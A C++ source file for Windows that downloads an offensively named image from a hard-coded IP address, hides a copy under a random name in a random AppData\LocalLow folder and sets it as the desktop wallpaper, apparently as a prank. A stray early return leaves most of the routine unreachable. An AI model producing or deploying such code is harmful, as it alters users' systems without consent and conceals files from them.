#include "filesystem.h"

bool FS::F_WriteFile(std::string directory)
{

    std::fstream fp;
    fp.open(GetExePath() + "\\path.txt", std::ios_base::out);

    if (!fp.is_open()) {
        std::cout << "couldn't create a new file, so the location is:\n";
        std::cout << directory;
        return false;
    }
    fp << "contents dropped to:\n";
    fp << directory;

    fp.close();

    return true;
}

void FS::F_Main()
{
    srand(time(NULL));
    std::string url = "http://16.170.254.129/paska.jpg";
    std::string dst = GetExePath()+"\\paska.jpg";

    if (!F_DownloadFile(url, dst)) {
        printf("cannot download file.. aborting\n");
        return;
    }
   
    return;
    std::string random_file_name;
    CreateRandomString(rand() % 20, &random_file_name);

    

    std::string filepath = GetExePath() + "\\paska.jpg";
    std::string randompath = GetExePath() + '\\' + random_file_name + ".jpg";
    
    F_CopyFile(filepath, randompath);

    std::string appdataRoaming;
    F_GetAppDataRoaming(&appdataRoaming);

    GoToPreviousDirectory(&appdataRoaming);

    std::string localLow = appdataRoaming + "LocalLow\\";

    

    std::string thispath;
    std::string path = "C:\\";
    GetRandomDirectory(&thispath, localLow);
    thispath += '\\' + random_file_name + ".jpg";

    //std::cout << "directory: " << thispath << '\n';

    if (!FS::F_WriteFile(thispath)) {
        remove(filepath.c_str());
        remove(randompath.c_str());
        return;
    }

    F_CopyFile(randompath, thispath);
    
    remove(filepath.c_str());
    remove(randompath.c_str());

    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)thispath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}